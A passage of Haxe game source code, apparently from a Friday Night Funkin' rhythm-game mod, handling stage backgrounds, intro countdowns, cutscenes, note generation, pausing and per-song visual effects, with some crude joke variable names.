				var bg:BGSprite = new BGSprite('bg', -900, -400, Paths.image('backgrounds/shared/sky'), null, 0.2, 0.2);
				bg.setGraphicSize(Std.int(bg.width * 2));
				bg.updateHitbox();
				sprites.add(bg);
				add(bg);

				var sunsetBG:BGSprite = new BGSprite('sunsetBG', -900, -400, Paths.image('backgrounds/shared/sky_sunset'), null, 0.2, 0.2);
				sunsetBG.setGraphicSize(Std.int(sunsetBG.width * 2));
				sunsetBG.updateHitbox();
				sunsetBG.alpha = 0;
				sprites.add(sunsetBG);
				add(sunsetBG);
				
				var nightBG:BGSprite = new BGSprite('nightBG', -900, -400, Paths.image('backgrounds/shared/sky_night'), null, 0.2, 0.2);
				nightBG.setGraphicSize(Std.int(nightBG.width * 2));
				nightBG.updateHitbox();
				nightBG.alpha = 0;
				sprites.add(nightBG);
				add(nightBG);
				
				desertBG = new BGSprite('desert', -786, -500, Paths.image('backgrounds/wedcape_from_cali_backlground', 'shared'), null, 1, 1, true);
				desertBG.setGraphicSize(Std.int(desertBG.width * 1.2));
				desertBG.updateHitbox();
				sprites.add(desertBG);
				add(desertBG);

				desertBG2 = new BGSprite('desert2', desertBG.x - desertBG.width, desertBG.y, Paths.image('backgrounds/wedcape_from_cali_backlground', 'shared'), null, 1, 1, true);
				desertBG2.setGraphicSize(Std.int(desertBG2.width * 1.2));
				desertBG2.updateHitbox();
				sprites.add(desertBG2);
				add(desertBG2);
				
				sign = new BGSprite('sign', 500, 450, Paths.image('california/leavingCalifornia', 'shared'), null, 1, 1, true);
				sprites.add(sign);
				add(sign);

				train = new BGSprite('train', -800, 500, 'california/train', [
					new Animation('idle', 'trainRide', 24, true, [false, false])
				], 1, 1, true, true);
				train.animation.play('idle');
				train.setGraphicSize(Std.int(train.width * 2.5));
				train.updateHitbox();
				train.antialiasing = false;
				sprites.add(train);
				add(train);
			case 'master':
				bgZoom = 0.4;
				stageName = 'master';

				var space:BGSprite = new BGSprite('space', -1724, -971, Paths.image('backgrounds/shared/sky_space'), null, 1.2, 1.2);
				space.setGraphicSize(Std.int(space.width * 10));
				space.antialiasing = false;
				sprites.add(space);
				add(space);
	
				var land:BGSprite = new BGSprite('land', 675, 555, Paths.image('backgrounds/dave-house/land'), null, 0.9, 0.9);
				sprites.add(land);
				add(land);
			case 'overdrive':
				bgZoom = 0.8;
				stageName = 'overdrive';

				var stfu:BGSprite = new BGSprite('stfu', -583, -383, Paths.image('backgrounds/stfu'), null, 1, 1);
				sprites.add(stfu);
				add(stfu);
			default:
				bgZoom = 0.9;
				stageName = 'stage';

				var bg:BGSprite = new BGSprite('bg', -600, -200, Paths.image('backgrounds/stage/stageback'), null, 0.9, 0.9);
				sprites.add(bg);
				add(bg);
	
				var stageFront:BGSprite = new BGSprite('stageFront', -650, 600, Paths.image('backgrounds/stage/stagefront'), null, 0.9, 0.9);
				stageFront.setGraphicSize(Std.int(stageFront.width * 1.1));
				stageFront.updateHitbox();
				sprites.add(stageFront);
				add(stageFront);
	
				var stageCurtains:BGSprite = new BGSprite('stageCurtains', -500, -300, Paths.image('backgrounds/stage/stagecurtains'), null, 1.3, 1.3);
				stageCurtains.setGraphicSize(Std.int(stageCurtains.width * 0.9));
				stageCurtains.updateHitbox();
				sprites.add(stageCurtains);
				add(stageCurtains);
		}
		if (!revertedBG)
		{
			defaultCamZoom = bgZoom;
			curStage = stageName;
		}

		return sprites;
	}
	public function getBackgroundColor(stage:String):FlxColor
	{
		var variantColor:FlxColor = FlxColor.WHITE;
		switch (stage)
		{
			case 'bambiFarmNight' | 'daveHouse_night' | 'backyard' | 'bedroomNight':
				variantColor = nightColor;
			case 'bambiFarmSunset' | 'daveHouse_sunset':
				variantColor = sunsetColor;
			default:
				variantColor = FlxColor.WHITE;
		}
		return variantColor;
	}

	function schoolIntro(?dialogueBox:DialogueBox, isStart:Bool = true):Void
	{
		inCutscene = true;
		camFollow.setPosition(boyfriend.getGraphicMidpoint().x - 200, dad.getGraphicMidpoint().y - 10);
		var black:FlxSprite = new FlxSprite(-100, -100).makeGraphic(FlxG.width * 2, FlxG.height * 2, FlxColor.BLACK);
		black.scrollFactor.set();
		add(black);

		var stupidBasics:Float = 1;
		if (isStart)
		{
			FlxTween.tween(black, {alpha: 0}, stupidBasics);
		}
		else
		{
			black.alpha = 0;
			stupidBasics = 0;
		}
		new FlxTimer().start(stupidBasics, function(fuckingSussy:FlxTimer)
		{
			if (dialogueBox != null)
			{
				add(dialogueBox);
			}
			else
			{
				startCountdown();
			}
		});
	}

	var startTimer:FlxTimer;
	var perfectMode:Bool = false;

	function voidShader(background:BGSprite)
	{
		#if (SHADERS_ENABLED || mac)
		var testshader:Shaders.GlitchEffect = new Shaders.GlitchEffect();
		testshader.waveAmplitude = 0.1;
		testshader.waveFrequency = 5;
		testshader.waveSpeed = 2;
		
		background.shader = testshader.shader;
		#end
		curbg = background;
	}
	function changeInterdimensionBg(type:String)
	{
		for (sprite in backgroundSprites)
		{
			backgroundSprites.remove(sprite);
			remove(sprite);
		}
		interdimensionBG = new BGSprite('void', -600, -200, '', null, 1, 1, false, true);
		backgroundSprites.add(interdimensionBG);
		add(interdimensionBG);
		switch (type)
		{
			case 'interdimension-void':
				interdimensionBG.loadGraphic(Paths.image('backgrounds/void/interdimensions/interdimensionVoid'));
				interdimensionBG.setPosition(-700, -350);
				interdimensionBG.setGraphicSize(Std.int(interdimensionBG.width * 1.75));
			case 'spike-void':
				interdimensionBG.loadGraphic(Paths.image('backgrounds/void/interdimensions/spike'));
				interdimensionBG.setPosition(-200, 0);
				interdimensionBG.setGraphicSize(Std.int(interdimensionBG.width * 3));
			case 'darkSpace':
				interdimensionBG.loadGraphic(Paths.image('backgrounds/void/interdimensions/darkSpace'));
				interdimensionBG.setPosition(-200, 0);
				interdimensionBG.setGraphicSize(Std.int(interdimensionBG.width * 2.75));
			case 'hexagon-void':
				interdimensionBG.loadGraphic(Paths.image('backgrounds/void/interdimensions/hexagon'));
				interdimensionBG.setPosition(-200, 0);
				interdimensionBG.setGraphicSize(Std.int(interdimensionBG.width * 3));
			case 'nimbi-void':
				interdimensionBG.loadGraphic(Paths.image('backgrounds/void/interdimensions/nimbi/nimbiVoid'));
				interdimensionBG.setPosition(-200, 0);
				interdimensionBG.setGraphicSize(Std.int(interdimensionBG.width * 2.75));

				nimbiLand = new BGSprite('nimbiLand', 200, 100, Paths.image('backgrounds/void/interdimensions/nimbi/nimbi_land'), null, 1, 1, false, true);
				backgroundSprites.add(nimbiLand);
				nimbiLand.setGraphicSize(Std.int(nimbiLand.width * 1.5));
				insert(members.indexOf(flyingBgChars), nimbiLand);

				nimbiSign = new BGSprite('sign', 800, -73, Paths.image('backgrounds/void/interdimensions/nimbi/sign'), null, 1, 1, false, true);
				backgroundSprites.add(nimbiSign);
				nimbiSign.setGraphicSize(Std.int(nimbiSign.width * 0.2));
				insert(members.indexOf(flyingBgChars), nimbiSign);
		}
		voidShader(interdimensionBG);
		currentInterdimensionBG = type;
	}
	function startCountdown():Void
	{
		inCutscene = false;

		generateStaticArrows(0);
		generateStaticArrows(1);

		talking = false;
		startedCountdown = true;
		Conductor.songPosition = 0;
		Conductor.songPosition -= Conductor.crochet * 5;
		var swagCounter:Int = 0;

		startTimer = new FlxTimer().start(Conductor.crochet / 1000, function(tmr:FlxTimer)
		{
			dad.dance();
			gf.dance();
			boyfriend.playAnim('idle', true);
			crowdPeople.forEach(function(crowdPerson:BGSprite)
			{
				crowdPerson.animation.play('idle', true);
			});

			var introAssets:Map<String, Array<String>> = new Map<String, Array<String>>();
			var introSoundAssets:Map<String, Array<String>> = new Map<String, Array<String>>();
			var soundAssetsAlt:Array<String> = new Array<String>();

			switch (SONG.song.toLowerCase())
			{
				case 'exploitation':
					introAssets.set('default', ['ui/ready', "ui/set", "ui/go_glitch"]);
				case 'overdrive':
					introAssets.set('default', ['ui/spr_start_sprites_0', "ui/spr_start_sprites_1", "ui/spr_start_sprites_2"]);
				default:
					introAssets.set('default', ['ui/ready', "ui/set", "ui/go"]);
			}
			introSoundAssets.set('default', ['default/intro3', 'default/intro2', 'default/intro1', 'default/introGo']);
			introSoundAssets.set('pixel', ['pixel/intro3-pixel', 'pixel/intro2-pixel', 'pixel/intro1-pixel', 'pixel/introGo-pixel']);
			introSoundAssets.set('dave', ['dave/intro3_dave', 'dave/intro2_dave', 'dave/intro1_dave', 'dave/introGo_dave']);
			introSoundAssets.set('bambi', ['bambi/intro3_bambi', 'bambi/intro2_bambi', 'bambi/intro1_bambi', 'bambi/introGo_bambi']);
			introSoundAssets.set('ex', ['default/intro3', 'default/intro2', 'default/intro1', 'ex/introGo_weird']);
			introSoundAssets.set('overdriving', ['dave/intro1_dave', 'dave/intro2_dave', 'dave/intro3_dave', 'dave/introGo_dave']);

			switch (SONG.song.toLowerCase())
			{
				case 'house' | 'insanity' | 'polygonized' | 'bonus-song' | 'interdimensional' | 'five-nights' |
				'memory' | 'vs-dave-rap' | 'vs-dave-rap-two':
					soundAssetsAlt = introSoundAssets.get('dave');
				case 'blocked' | 'cheating' | 'corn-theft' | 'glitch' | 'maze' | 'mealie' | 'secret' |
				'shredder' | 'supernovae' | 'unfairness':
					soundAssetsAlt = introSoundAssets.get('bambi');
				case 'exploitation':
					soundAssetsAlt = introSoundAssets.get('ex');
				case 'overdrive':
					soundAssetsAlt = introSoundAssets.get('overdriving');	
				default:
					soundAssetsAlt = introSoundAssets.get('default');
			}

			var introAlts:Array<String> = introAssets.get('default');
			var altSuffix:String = "";

			var doing_funny:Bool = true;

			for (value in introAssets.keys())
			{
				if (value == curStage)
				{
					introAlts = introAssets.get(value);
					altSuffix = '-pixel';
				}
			}

			switch (swagCounter)
			{
				case 0:
					FlxG.sound.play(Paths.sound('introSounds/' + soundAssetsAlt[0]), 0.6);
					if (doing_funny)
					{
						focusOnDadGlobal = false;
						ZoomCam(false);
					}
				case 1:
					var ready:FlxSprite = new FlxSprite().loadGraphic(Paths.image(introAlts[0]));
					ready.scrollFactor.set();
					ready.updateHitbox();
					ready.antialiasing = true;

					ready.screenCenter();
					add(ready);
					FlxTween.tween(ready, {y: ready.y += 100, alpha: 0}, Conductor.crochet / 1000, {
						ease: FlxEase.cubeInOut,
						onComplete: function(twn:FlxTween)
						{
							ready.destroy();
						}
					});
					FlxG.sound.play(Paths.sound('introSounds/' + soundAssetsAlt[1]), 0.6);
					if (doing_funny)
					{
						focusOnDadGlobal = true;
						ZoomCam(true);
					}
				case 2:
					var set:FlxSprite = new FlxSprite().loadGraphic(Paths.image(introAlts[1]));
					set.scrollFactor.set();
			
					set.screenCenter();

					set.antialiasing = true;
					add(set);
					FlxTween.tween(set, {y: set.y += 100, alpha: 0}, Conductor.crochet / 1000, {
						ease: FlxEase.cubeInOut,
						onComplete: function(twn:FlxTween)
						{
							set.destroy();
						}
					});
					FlxG.sound.play(Paths.sound('introSounds/' + soundAssetsAlt[2]), 0.6);
					if (doing_funny)
					{
						focusOnDadGlobal = false;
						ZoomCam(false);
					}
				case 3:
					var go:FlxSprite = new FlxSprite().loadGraphic(Paths.image(introAlts[2]));
					go.scrollFactor.set();

					go.updateHitbox();

					go.screenCenter();

					go.antialiasing = true;
					add(go);

					var sex:Float = 1000;

					if (SONG.song.toLowerCase() == "exploitation")
					{
						sex = 300;
					}

					FlxTween.tween(go, {y: go.y += 100, alpha: 0}, Conductor.crochet / sex, {
						ease: FlxEase.cubeInOut,
						onComplete: function(twn:FlxTween)
						{
							go.destroy();
						}
					});
					FlxG.sound.play(Paths.sound('introSounds/' + soundAssetsAlt[3]), 0.6);

					if (doing_funny)
					{
						focusOnDadGlobal = true;
						ZoomCam(true);
					}
				case 4:
					if (!isGreetingsCutscene)
					{
						creditsPopup = new CreditsPopUp(FlxG.width, 200);
						creditsPopup.camera = camHUD;
						creditsPopup.scrollFactor.set();
						creditsPopup.x = creditsPopup.width * -1;
						add(creditsPopup);
	
						FlxTween.tween(creditsPopup, {x: 0}, 0.5, {ease: FlxEase.backOut, onComplete: function(tweeen:FlxTween)
						{
							FlxTween.tween(creditsPopup, {x: creditsPopup.width * -1} , 1, {ease: FlxEase.backIn, onComplete: function(tween:FlxTween)
							{
								creditsPopup.destroy();
							}, startDelay: 3});
						}});
					}
					if (['polygonized', 'interdimensional', 'five-nights'].contains(SONG.song.toLowerCase()) && localFunny != CharacterFunnyEffect.Recurser)
					{
						var shapeNoteWarning = new FlxSprite(0, FlxG.height * 2).loadGraphic(Paths.image(!inFiveNights ? 'ui/shapeNoteWarning' : 'ui/doorWarning'));
						shapeNoteWarning.cameras = [camHUD];
						shapeNoteWarning.scrollFactor.set();
						shapeNoteWarning.antialiasing = false;
						shapeNoteWarning.alpha = 0;
						add(shapeNoteWarning);

						FlxTween.tween(shapeNoteWarning, {alpha: 1}, 1);
						FlxTween.tween(shapeNoteWarning, {y: 450}, 1, {ease: FlxEase.backOut, 
							onComplete: function(tween:FlxTween)
							{
								new FlxTimer().start(2, function(timer:FlxTimer)
								{
									FlxTween.tween(shapeNoteWarning, {alpha: 0}, 1);
									FlxTween.tween(shapeNoteWarning, {y: FlxG.height * 2}, 1, {
										ease: FlxEase.backIn,
										onComplete: function(tween:FlxTween)
										{
											remove(shapeNoteWarning);
										}
									});
								});
							}
						});
					}
			}

			swagCounter += 1;
			// generateSong('fresh');
		}, 5);
	}

	function playCutscene(name:String)
	{
		inCutscene = true;
		FlxG.sound.music.stop();

		video = new VideoHandler();
		video.finishCallback = function()
		{
			switch (curSong.toLowerCase())
			{
				case 'house':
					var doof:DialogueBox = new DialogueBox(false, dialogue, isStoryMode);
					// doof.x += 70;
					// doof.y = FlxG.height * 0.5;
					doof.scrollFactor.set();
					doof.finishThing = startCountdown;
					schoolIntro(doof);
				default:
					startCountdown();
			}
		}
		video.playVideo(Paths.video(name));
	}

	function playEndCutscene(name:String)
	{
		inCutscene = true;

		video = new VideoHandler();
		video.finishCallback = function()
		{
			LoadingState.loadAndSwitchState(new PlayState());
		}
		video.playVideo(Paths.video(name));
	}

	var previousFrameTime:Int = 0;
	var songTime:Float = 0;

	function startSong():Void
	{
		startingSong = false;

		previousFrameTime = FlxG.game.ticks;

		if (!paused)
		{
			FlxG.sound.playMusic(Paths.inst(PlayState.SONG.song), 1, false);
			vocals.play();
		}
		for (tween in tweenList)
		{
			tween.active = true;
		}
		activateSunTweens = true;

		#if desktop
		DiscordClient.changePresence(detailsText
			+ " "
			+ SONG.song
			+ " ("
			+ storyDifficultyText
			+ ") ",
			"\nAcc: "
			+ truncateFloat(accuracy, 2)
			+ "% | Score: "
			+ songScore
			+ " | Misses: "
			+ misses, iconRPC);
		#end
		FlxG.sound.music.onComplete = endSong;
		if (songPosBar != null)
		{
			songPosBar.setRange(0, FlxG.sound.music.length);
		}
		if (songName != null && barType == 'ShowTime')
		{
			FlxTween.tween(songName, {alpha: 1}, 1);
		}
		switch (SONG.song.toLowerCase())
		{
			case 'escape-from-california':
				dad.canSing = false;
				dad.canDance = false;
				dad.playAnim('helpMe', true);
				dad.animation.finishCallback = function(anim:String)
				{
					dad.canSing = true;
					dad.canDance = true;
				}
				FlxTween.num(0, 30, 2, {}, function(newValue:Float)
				{
					trainSpeed = newValue;
					train.animation.curAnim.frameRate = Std.int(FlxMath.lerp(0, 24, (trainSpeed / 30)));
				});
			case 'supernovae' | 'glitch' | 'master':
				Application.current.window.title = banbiWindowNames[new FlxRandom().int(0, banbiWindowNames.length - 1)];
			case 'exploitation':
				blackScreen = new FlxSprite().makeGraphic(FlxG.width * 2, FlxG.height * 2, FlxColor.BLACK);
				blackScreen.cameras = [camHUD];
				blackScreen.screenCenter();
				blackScreen.scrollFactor.set();
				blackScreen.alpha = 0;
				add(blackScreen);
					
				Application.current.window.title = "[DATA EXPUNGED]";
				Application.current.window.setIcon(lime.graphics.Image.fromFile("art/icons/iconAAAA.png"));
			case 'vs-dave-rap' | 'vs-dave-rap-two':
				FlxTween.tween(blackScreen, {alpha: 0}, 3, {onComplete: function(tween:FlxTween)
				{
					remove(blackScreen);
				}});
			case 'five-nights':
				FlxG.mouse.visible = true;
			case 'greetings':
				if (isGreetingsCutscene)
				{
					generatedMusic = false;
					vocals.stop();
					vocals.volume = 0;
					FlxG.sound.music.onComplete = null;
					FlxG.sound.music.stop();
					for (note in unspawnNotes)
					{
						unspawnNotes.remove(note);
					}
					greetingsCutscene();
				}
			case 'indignancy':
				/*vignette = new FlxSprite().loadGraphic(Paths.image('vignette'));
				vignette.screenCenter();
				vignette.scrollFactor.set();
				vignette.cameras = [camHUD];
				vignette.alpha = 0;
				add(vignette);
				FlxTween.tween(vignette, {alpha: 0.7}, 1);*/
		}
	}

	var debugNum:Int = 0;

	private function generateSong(dataPath:String):Void
	{
		var songData = SONG;
		Conductor.changeBPM(songData.bpm);

		curSong = songData.song;

		if (SONG.needsVoices)
			vocals = new FlxSound().loadEmbedded(Paths.voices(PlayState.SONG.song, localFunny == CharacterFunnyEffect.Tristan ? "-Tristan" : ""));
		else
			vocals = new FlxSound();

		FlxG.sound.list.add(vocals);

		notes = new FlxTypedGroup<Note>();
		add(notes);

		var noteData:Array<SwagSection>;

		// NEW SHIT
		noteData = songData.notes;

		var playerCounter:Int = 0;

		for (section in noteData)
		{
			var sectionCount = noteData.indexOf(section);

			var isGuitarSection = (sectionCount >= 64 && sectionCount < 80) && SONG.song.toLowerCase() == 'shredder';

			var coolSection:Int = Std.int(section.lengthInSteps / 4);

			for (songNotes in section.sectionNotes)
			{
				var daStrumTime:Float = songNotes[0];
				var daNoteData:Int = Std.int(songNotes[1] % (isGuitarSection ? 5 : 4));
				var OGNoteDat = daNoteData;
				if (localFunny == CharacterFunnyEffect.Bambi)
				{
					daNoteData = 2;
				}
				var daNoteStyle:String = songNotes[3];
				if (localFunny == CharacterFunnyEffect.Recurser)
				{
					daNoteStyle = 'normal';
				}

				var gottaHitNote:Bool = section.mustHitSection;

				if (songNotes[1] > (isGuitarSection ? 4 : 3))
				{
					gottaHitNote = !section.mustHitSection;
				}

				var oldNote:Note;
				if (unspawnNotes.length > 0)
					oldNote = unspawnNotes[Std.int(unspawnNotes.length - 1)];
				else
					oldNote = null;

				var swagNote:Note = new Note(daStrumTime, daNoteData, oldNote, false, gottaHitNote, daNoteStyle, false, isGuitarSection);
				swagNote.originalType = OGNoteDat;
				swagNote.sustainLength = songNotes[2];
				swagNote.scrollFactor.set(0, 0);

				var susLength:Float = swagNote.sustainLength;

				susLength = susLength / Conductor.stepCrochet;
				unspawnNotes.push(swagNote);

				for (susNote in 0...Math.floor(susLength))
				{
					oldNote = unspawnNotes[Std.int(unspawnNotes.length - 1)];

					var sustainNote:Note = new Note(daStrumTime + (Conductor.stepCrochet * susNote) + Conductor.stepCrochet, daNoteData, oldNote, true,
						gottaHitNote, daNoteStyle, false, isGuitarSection);
					sustainNote.originalType = OGNoteDat;
					sustainNote.scrollFactor.set();
					unspawnNotes.push(sustainNote);

					sustainNote.mustPress = gottaHitNote;
				}

				swagNote.mustPress = gottaHitNote;
			}
		}

		// trace(unspawnNotes.length);
		// playerCounter += 1;

		unspawnNotes.sort(sortByShit);

		generatedMusic = true;
	}

	function sortByShit(Obj1:Note, Obj2:Note):Int
	{
		return FlxSort.byValues(FlxSort.ASCENDING, Obj1.strumTime, Obj2.strumTime);
	}

	private function generateStaticArrows(player:Int, regenerate:Bool = false, fadeIn:Bool = true):Void
	{
		var note_order:Array<Int> = [0,1,2,3];
		if (localFunny == CharacterFunnyEffect.Bambi)
		{
			note_order = [2,2,2,2];
		}
		else if (localFunny == CharacterFunnyEffect.Tristan)
		{
			note_order = [0,3,2,1];
		}
		for (i in 0...4)
		{
			var arrowType:Int = note_order[i];
			var strumType:String = '';
			if ((funnyFloatyBoys.contains(dad.curCharacter) || dad.curCharacter == "nofriend") && player == 0 || funnyFloatyBoys.contains(boyfriend.curCharacter) && player == 1)
			{
				strumType = '3D';
			}
			else
			{
				switch (curStage)
				{
					default:
						if (SONG.song.toLowerCase() == "overdrive")
							strumType = 'top10awesome';
				}
			}
			if (pressingKey5Global)
			{
				strumType = 'shape';
			}
			var babyArrow:StrumNote = new StrumNote(0, strumLine.y, strumType, arrowType, player == 1);

			if (!isStoryMode && fadeIn)
			{
				babyArrow.y -= 10;
				babyArrow.alpha = 0;
				FlxTween.tween(babyArrow, {y: babyArrow.y + 10, alpha: 1}, 1, {ease: FlxEase.circOut, startDelay: 0.5 + (0.2 * i)});
			}
			babyArrow.x += Note.swagWidth * Math.abs(i);
			babyArrow.x += 78 + 78 / playerStrumAmount;
			babyArrow.x += ((FlxG.width / 2) * player);
			
			babyArrow.baseX = babyArrow.x;
			if (player == 1)
			{
				playerStrums.add(babyArrow);
			}
			else
			{
				dadStrums.add(babyArrow);
			}
			strumLineNotes.add(babyArrow);
		}
	}
	function generateGhNotes(player:Int)
	{
		for (i in 0...5)
		{
			var arrowType:Int = i;
			if (localFunny == CharacterFunnyEffect.Bambi)
			{
				arrowType = 2;
			}
			var babyArrow:StrumNote = new StrumNote(0, strumLine.y, 'gh', i, false);

			babyArrow.x += Note.swagWidth * Math.abs(i);
			babyArrow.x += 78;
			babyArrow.baseX = babyArrow.x;
			dadStrums.add(babyArrow);
			strumLineNotes.add(babyArrow);
		}
	}
	function regenerateStaticArrows(player:Int, fadeIn = true)
	{
		switch (player)
		{
			case 0:
				dadStrums.forEach(function(spr:StrumNote)
				{
					dadStrums.remove(spr);
					strumLineNotes.remove(spr);
					remove(spr);
					spr.destroy();
				});
			case 1:
				playerStrums.forEach(function(spr:StrumNote)
				{
					playerStrums.remove(spr);
					strumLineNotes.remove(spr);
					remove(spr);
					spr.destroy();
				});
		}
		generateStaticArrows(player, false, fadeIn);
	}

	function tweenCamIn():Void
	{
		FlxTween.tween(FlxG.camera, {zoom: 1.3}, (Conductor.stepCrochet * 4 / 1000), {ease: FlxEase.sineInOut});
	}

	override function openSubState(SubState:FlxSubState)
	{
		if (paused)
		{
			if (FlxG.sound.music != null)
			{
				FlxG.sound.music.pause();
				vocals.pause();
				if (exbungo_funny != null)
				{
					exbungo_funny.pause();
				}
			}
			if (tweenList != null && tweenList.length != 0)
			{
				for (tween in tweenList)
				{
					if (!tween.finished)
					{
						tween.active = false;
					}
				}
			}
			if (rotatingCamTween != null)
			{
				rotatingCamTween.active = false;
			}
			for (tween in pauseTweens)
			{
				tween.active = false;
			}
			
			#if desktop
			DiscordClient.changePresence("PAUSED on "
				+ SONG.song
				+ " ("
				+ storyDifficultyText
				+ ") |",
				"Acc: "
				+ truncateFloat(accuracy, 2)
				+ "% | Score: "
				+ songScore
				+ " | Misses: "
				+ misses, iconRPC);
			#end
			if (startTimer != null && !startTimer.finished)
				startTimer.active = false;
		}

		super.openSubState(SubState);
	}

	public function throwThatBitchInThere(guyWhoComesIn:String = 'bambi', guyWhoFliesOut:String = 'dave')
	{
		hasTriggeredDumbshit = true;
		if(BAMBICUTSCENEICONHURHURHUR != null)
		{
			remove(BAMBICUTSCENEICONHURHURHUR);
		}
		BAMBICUTSCENEICONHURHURHUR = new HealthIcon(guyWhoComesIn, false);
		BAMBICUTSCENEICONHURHURHUR.changeState(iconP2.getState());
		BAMBICUTSCENEICONHURHURHUR.y = healthBar.y - (BAMBICUTSCENEICONHURHURHUR.height / 2);
		add(BAMBICUTSCENEICONHURHURHUR);
		BAMBICUTSCENEICONHURHURHUR.cameras = [camHUD];
		BAMBICUTSCENEICONHURHURHUR.x = -100;
		FlxTween.linearMotion(BAMBICUTSCENEICONHURHURHUR, -100, BAMBICUTSCENEICONHURHURHUR.y, iconP2.x, BAMBICUTSCENEICONHURHURHUR.y, 0.3, true, {ease: FlxEase.expoInOut});
		AUGHHHH = guyWhoComesIn;
		AHHHHH = guyWhoFliesOut;
		new FlxTimer().start(0.3, FlingCharacterIconToOblivionAndBeyond);
	}

	override function closeSubState()
	{
		if (paused)
		{
			if (FlxG.sound.music != null && !startingSong)
			{
				resyncVocals();
			}

			if (startTimer != null && !startTimer.finished)
				startTimer.active = true;

			if (tweenList != null && tweenList.length != 0)
			{
				for (tween in tweenList)
				{
					if (!tween.finished && activateSunTweens)
					{
						tween.active = true;
					}
				}
			}
			if (rotatingCamTween != null)
			{
				rotatingCamTween.active = true;
			}
			for (tween in pauseTweens)
			{
				tween.active = true;
			}
			paused = false;

			if (startTimer != null && startTimer.finished)
			{
				#if desktop
				DiscordClient.changePresence(detailsText
					+ " "
					+ SONG.song
					+ " ("
					+ storyDifficultyText
					+ ") ",
					"\nAcc: "
					+ truncateFloat(accuracy, 2)
					+ "% | Score: "
					+ songScore
					+ " | Misses: "
					+ misses, iconRPC, true,
					FlxG.sound.music.length
					- Conductor.songPosition);
				#end
			}
			else
			{
				#if desktop
				DiscordClient.changePresence(detailsText, SONG.song + " (" + storyDifficultyText + ") ", iconRPC);
				#end
			}
		}

		super.closeSubState();
	}

	function resyncVocals():Void
	{
		vocals.pause();
		FlxG.sound.music.play();
		Conductor.songPosition = FlxG.sound.music.time;
		vocals.time = Conductor.songPosition;
		vocals.play();

		#if desktop
		DiscordClient.changePresence(detailsText
			+ " "
			+ SONG.song
			+ " ("
			+ storyDifficultyText
			+ ") ",
			"\nAcc: "
			+ truncateFloat(accuracy, 2)
			+ "% | Score: "
			+ songScore
			+ " | Misses: "
			+ misses, iconRPC);
		#end
	}

	public static var paused:Bool = false;
	var startedCountdown:Bool = false;
	var canPause:Bool = true;

	function truncateFloat(number:Float, precision:Int):Float
	{
		var num = number;
		num = num * Math.pow(10, precision);
		num = Math.round(num) / Math.pow(10, precision);
		return num;
	}

	override public function update(elapsed:Float)
	{
		elapsedtime += elapsed;
		
		if (songName != null && barType == 'ShowTime')
		{
			songName.text = FlxStringUtil.formatTime((FlxG.sound.music.length - FlxG.sound.music.time) / 1000);
		}

		if (startingSong && startTimer != null && !startTimer.active)
			startTimer.active = true;

		if (localFunny == CharacterFunnyEffect.Exbungo)
		{
			FlxG.sound.music.volume = 0;
			exbungo_funny.play();
		}
			
		if (paused && FlxG.sound.music != null && vocals != null && vocals.playing)
		{
			FlxG.sound.music.pause();
			vocals.pause();
		}
		if (curbg != null)
		{
			if (curbg.active) // only the polygonized background is active
			{
				#if (SHADERS_ENABLED || mac)
				var shad = cast(curbg.shader, Shaders.GlitchShader);
				shad.uTime.value[0] += elapsed;
				#end
			}
		}
		if (SONG.song.toLowerCase() == 'escape-from-california')
		{
			var scrollSpeed = 100;
			if (desertBG != null)
			{
				desertBG.x -= trainSpeed * scrollSpeed * elapsed;
			
				if (desertBG.x <= -(desertBG.width) + (desertBG.width - 1280))
				{
					desertBG.x = desertBG.width - 1280;
				}
				desertBG2.x = desertBG.x - desertBG.width;
				desertBG2.y = desertBG.y;
			}
			
			if (sign != null)
			{
				sign.x -= trainSpeed * scrollSpeed * elapsed;
			}
			if (georgia != null)
			{
				georgia.x -= trainSpeed * scrollSpeed * elapsed;
			}
		}

		if (SONG.song.toLowerCase() == 'recursed')
		{
			var scrollSpeed = 150;
			charBackdrop.x -= scrollSpeed * elapsed;
			charBackdrop.y += scrollSpeed * elapsed;

			darkSky.x += 40 * scrollSpeed * elapsed;
			if (darkSky.x >= (darkSkyStartPos * 4) - 1280)
			{
				darkSky.x = resetPos;
			}
			darkSky2.x = darkSky.x - darkSky.width;
			
			var lerpVal = 0.97;
			freeplayBG.alpha = FlxMath.lerp(0, freeplayBG.alpha, lerpVal);
			charBackdrop.alpha = FlxMath.lerp(0, charBackdrop.alpha, lerpVal);
			for (char in alphaCharacters)
			{
				for (letter in char.characters)
				{
					letter.alpha = FlxMath.lerp(0, letter.alpha, lerpVal);
				}
			}
			if (isRecursed)
			{
				timeLeft -= elapsed;
				if (timeLeftText != null)
				{
					timeLeftText.text = FlxStringUtil.formatTime(Math.floor(timeLeft));
				}

				camRotateAngle += elapsed * 5 * (rotateCamToRight ? 1 : -1);

				FlxG.camera.angle = camRotateAngle;
				camHUD.angle = camRotateAngle;

				if (camRotateAngle > 8)
				{
					rotateCamToRight = false;
				}
				else if (camRotateAngle < -8)
				{
					rotateCamToRight = true;
				}
				
				health = FlxMath.lerp(0, 2, timeLeft / timeGiven);
			}
			else
			{
				if (FlxG.camera.angle > 0 || camHUD.angle > 0)
				{
					cancelRecursedCamTween();
				}
			}
		}
		if (SONG.song.toLowerCase() == 'interdimensional')
		{
			var speed = 300;
			flyingBgChars.forEach(function(bgChar:FlyingBGChar)
			{
				var moveDir = bgChar.direction == 'left' ? -1 : bgChar.direction == 'right' ? 1 : 0;
				bgChar.x += speed * elapsed * moveDir * bgChar.randomSpeed;
				bgChar.y += (Math.sin(elapsedtime) * 5);
	
				bgChar.angle += bgChar.angleChangeAmount * elapsed;

				switch (bgChar.direction)
				{
					case 'left':
						if (bgChar.x < bgChar.leftPosCheck)
						{
							bgChar.switchDirection();
						}
					case 'right':
						if (bgChar.x > bgChar.rightPosCheck)
						{
							bgChar.switchDirection();
						}
				}
			});
		}
		if (SONG.song.toLowerCase() == 'shredder')
		{
			if (highway != null)
			{
				highwayRange += FlxG.elapsed * 0.45 * SONG.speed;
				if (highwayRange > 1)
				{
					highwayRange = 0;
				}
				var ranges = scrollType == 'upscroll' ? [720, -560] : [-560, 720];

				highway.y = FlxMath.lerp(ranges[0], ranges[1], highwayRange);
				highway2.y = highway.y - highway.height;
			}
		}
		if (SONG.song.toLowerCase() == 'five-nights')
		{
			powerLeft = Math.max(powerLeft - (elapsed / 3) * powerDrainer, 0);
			powerLeftText.text = 'Power Left: ${Math.floor(powerLeft)}%';
			if (powerLeft <= 0 && !powerRanOut && curStep < 1088)
			{
				powerRanOut = true;
				
				boyfriend.stunned = true;

				persistentUpdate = false;
				persistentDraw = false;
				paused = true;
	
				vocals.volume = 0;
